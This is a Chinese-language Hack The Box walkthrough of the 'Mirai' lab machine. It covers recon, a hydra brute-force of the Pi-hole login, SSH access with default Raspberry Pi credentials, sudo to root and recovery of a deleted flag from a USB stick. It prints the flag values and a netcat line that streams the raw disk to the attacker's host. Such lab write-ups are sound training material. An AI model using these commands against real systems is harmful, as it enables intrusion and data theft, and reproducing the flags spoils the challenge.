#  Mirai
- URL : https://app.hackthebox.eu/machines/64
- IP : 10.129.214.20

## Recon
- http://10.129.214.20/
    - 首頁是空ㄉ
    - ![](https://i.imgur.com/GuiVLRm.png)
- Rustscan
    - ![](https://i.imgur.com/6UNUiSx.png)
- nmap
    - `nmap -A -p22,53,80,2000,32400,32469 10.129.214.20`
        - ![](https://i.imgur.com/cUzhFGB.png)
- dirsearch 掃目錄
    - ![](https://i.imgur.com/kH5A7QG.png)
- 32400 Port 跑了一個 PLEX
    - ![](https://i.imgur.com/HGGDcnR.png)
- Pi-Hole 在 `:80/admin`
    - ![](https://i.imgur.com/AtDs7wt.png)
    - https://www.exploit-db.com/exploits/48442
        - 需要密碼才能 RCE
- dnsmasq Exploit
    `https://raw.githubusercontent.com/google/security-research-pocs/master/vulnerabilities/dnsmasq/CVE-2017-14491.py`

## 爆破密碼
- `hydra -l '' -P /opt/wordlists/rockyou.txt 10.129.214.20 http-post-form "/admin/index.php?login:pw=^PASS^:Forgot password"`
    - ![](https://i.imgur.com/JUZOiSX.png)
    - 跑了很久都沒有，應該不是 QQ

## Exploit
- 看到 Pi-Hole 又有 PLEX 影音伺服器
    - 猜他是樹梅派
- 所以 pi 預設帳密
    - `pi / raspberry`
- SSH
    - ![](https://i.imgur.com/rlacgEn.png)
    - 好無聊 = =
- 取得 User Flag
    - `ff837707441b257a20e32199d7c8838d`
## 提權
- 起手式 `sudo -l`
    - ![](https://i.imgur.com/yK4zBLq.png)
    - 發現可以直接變 root
## 數位鑑識
- 取 root flag
    - ![](https://i.imgur.com/BjshpiS.png)
    - 搞事ㄛ = =
- 確認外接裝置
    - ![](https://i.imgur.com/k6Wxr0n.png)
- 到隨身碟裡找東西
    - ![](https://i.imgur.com/mkC7OFW.png)
    - 詹姆斯在搞ㄛ = =
- 直接暴力解
    - `strings` 硬碟
    - ![](https://i.imgur.com/eObJQpt.png)
    - `3d3e483143ff12ec505d026fa13e020b`
- 暴力解也可以傳回本地處理
    - 本地監聽 `nc -l 1234 > usbstick.dump`
    - 遠端用 dd 把資料丟出來
        - `sudo dd if=/dev/sdb | nc -w3 10.10.16.35 1234`


## 嘗試失敗的方法 (Testdisk)
- 使用 Testdisk 還原
    - https://blog.gtwang.org/linux/testdisk-linux-recover-deleted-files/
- 用 scp 傳過去
    - ![](https://i.imgur.com/V62F2Lt.png)
- 解壓縮
    - ![](https://i.imgur.com/BBPoXx2.png)
- 用 sudo 執行
    - ![](https://i.imgur.com/KnYrwIq.png)
- 選定硬碟 sdb
    - ![](https://i.imgur.com/oFWPTPS.png)
- 預設沒有分割區
    - ![](https://i.imgur.com/Oxf8S78.png)
- 選擇格式
    - ![](https://i.imgur.com/ZOryLMZ.png)
- 找到刪除的 `root.txt`
    - ![](https://i.imgur.com/KDOh7aX.png)
    - 選到 `root.txt` 按 C
    - ![](https://i.imgur.com/FnV37tP.png)
- 選存檔位置
    - ![](https://i.imgur.com/Bamh5Pm.png)
    - ![](https://i.imgur.com/Bz6yOmm.png)
    - 但這樣出來的檔案是空的 QQ
